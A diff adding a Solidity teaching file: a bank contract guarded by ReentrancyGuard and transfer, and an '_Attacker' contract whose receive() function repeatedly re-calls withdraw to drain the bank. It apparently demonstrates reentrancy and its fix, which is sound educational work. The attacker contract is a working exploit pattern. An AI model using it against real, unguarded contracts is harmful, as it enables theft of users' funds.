@@ -1,0 +1,68 @@
+//SPDX-License-Identifier:MIT
+pragma solidity ^0.8.11;
+
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+// import "@openzeppelin/contracts/utils/Address.sol";
+import "hardhat/console.sol";
+
+contract Etherbank is ReentrancyGuard {  
+//    using Address for address payable;
+  mapping(address=>uint) public  balances;
+
+  function deposit()external payable{
+      balances[msg.sender] +=msg.value;
+  }
+  function withdraw()external  nonReentrant { 
+      require(balances[msg.sender]>0,"withdrawl amount is not enough");
+      console.log("");
+      console.log("victim balance",address(this).balance);
+      console.log("Attacker  balance",balances[msg.sender]);
+       console.log("");
+    //    uint accountbalance=balances[msg.sender];
+        // balances[msg.sender]=0;
+    //  (bool sent,)=msg.sender.call{value:amount}("");
+    //  require(sent,"failed to send Ether");
+       payable(msg.sender).transfer(balances[msg.sender]);
+       balances[msg.sender]=0;
+      
+  }
+  function getbalance()public view returns(uint){
+      return address(this).balance;
+  }
+}
+
+contract _Attacker{
+  Etherbank public etherbank;
+
+     address private owner;
+
+     constructor(address etherbankaddress){
+        etherbank=Etherbank(etherbankaddress);
+        owner =msg.sender;
+     }
+     modifier onlyowner(){
+         require(msg.sender==owner,"only owner can attack");
+         _;
+    }
+     function attack()external payable onlyowner{
+        etherbank.deposit{value:msg.value}();
+        etherbank.withdraw();   
+         }
+
+    receive()external payable{
+        if(address(etherbank).balance > 0){
+            // etherbank.withdraw(1 ether);
+        
+            console.log("reentering..");
+            etherbank.withdraw();
+        }
+        else
+        {
+            console.log("victim account is empty");
+            payable(msg.sender).transfer(address(this).balance);
+        }
+    }
+    function getbalance()external view returns(uint){
+        return address(this).balance;
+    }
+}
